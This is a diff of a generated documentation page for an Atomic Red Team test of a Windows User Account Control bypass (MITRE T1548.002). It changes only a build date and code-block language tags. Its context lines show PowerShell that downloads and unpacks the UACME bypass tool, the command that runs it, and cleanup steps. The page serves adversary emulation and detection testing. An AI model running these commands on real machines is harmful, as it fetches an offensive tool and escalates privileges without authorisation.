@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1548.002"
 attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "e514bb03-f71c-4b22-9092-9f961ec6fb03"
@@ -68,14 +68,14 @@ UACME executable must exist on disk at specified location ("#{uacme_exe}")
 
 ### Prerequisite Check
 
-```text
+```powershell
 $tempPath = cmd /c echo #{uacme_exe}
 if (Test-Path "$tempPath") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"
 Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder\..\ExternalPayloads\uacme" -Force
@@ -88,13 +88,13 @@ Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip" -Force
 
 ### Command
 
-```commandprompt
+```cmd
 "#{uacme_exe}"
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
 powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
 ```
